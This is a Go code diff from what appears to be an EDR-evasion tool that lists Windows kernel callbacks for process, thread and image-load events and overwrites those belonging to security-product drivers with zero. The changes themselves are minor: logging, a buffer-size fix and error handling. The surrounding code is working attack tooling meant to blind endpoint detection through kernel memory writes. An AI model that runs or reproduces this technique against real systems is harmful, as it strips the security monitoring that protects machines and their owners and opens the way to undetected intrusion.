@@ -609,12 +609,12 @@ func findNtoskrnlBaseAddress() DWORD64 {
 }
 
 func findDriver(adr DWORD64) (string, error) {
-	fmt.Printf("Address: %x\n", adr)
 	cbNeeded := uint32(0)
 	var drivers [1024]DWORD64
 	var diff DWORD64
 	minDiff := DWORD64(math.MaxUint64)
-	if EnumDeviceDrivers(uintptr(unsafe.Pointer(&drivers)), 1024, &cbNeeded) {
+	sizeOfdrivers := uint32(unsafe.Sizeof(drivers))
+	if EnumDeviceDrivers(uintptr(unsafe.Pointer(&drivers)), sizeOfdrivers, &cbNeeded) {
 		cDrivers := int(cbNeeded / 8) //8 means sizeof(drivers[0])
 		for i := 0; i < cDrivers; i++ {
 			if drivers[i] <= adr {
@@ -634,6 +634,7 @@ func findDriver(adr DWORD64) (string, error) {
 		return "", err
 	}
 	driver := syscall.UTF16ToString(szDriver[:])
+	fmt.Printf("[+] %x [%s + %x]\n", adr, driver, minDiff)
 	return driver, nil
 }
 
@@ -648,8 +649,7 @@ func operateNotifyRoutines(notifyRoutineAddress DWORD64, edrDrivers *FOUND_EDR_C
 			cbFunction := readMemoryDWORD64(device, callback)
 			driver, err := findDriver(cbFunction)
 			if err != nil {
-				fmt.Println(err)
-				//panic(err)
+				panic(err)
 			}
 			if driver != "" && isDriverEDR(driver) {
 				callbackAddr := notifyRoutineAddress + DWORD64(i*8) //8 means sizeof(DWORD64)
@@ -666,7 +666,6 @@ func operateNotifyRoutines(notifyRoutineAddress DWORD64, edrDrivers *FOUND_EDR_C
 					writeMemoryDWORD64(device, callbackAddr, 0x0000000000000000)
 					newFoundDriver.removed = true
 				}
-				fmt.Println(int(edrDrivers.index))
 				edrDrivers.EDR_CALLBACKS[int(edrDrivers.index)+currentEDRDriversCount] = newFoundDriver
 				currentEDRDriversCount++
 			}
@@ -728,9 +727,11 @@ func enumAllEDRKernelCallbacks() {
 	}
 	fmt.Printf("NtoskrnlVersion is %s\n", ntoskrnlOffsets.ntoskrnlVersion)
 	var edrDrivers FOUND_EDR_CALLBACKS
+	edrDrivers.index = 0
 	enumPspXNotifyRoutine(CREATE_PROCESS_ROUTINE, &edrDrivers, &ntoskrnlOffsets)
 	enumPspXNotifyRoutine(CREATE_THREAD_ROUTINE, &edrDrivers, &ntoskrnlOffsets)
 	enumPspXNotifyRoutine(LOAD_IMAGE_ROUTINE, &edrDrivers, &ntoskrnlOffsets)
+	println(edrDrivers.index)
 }
 
 /*
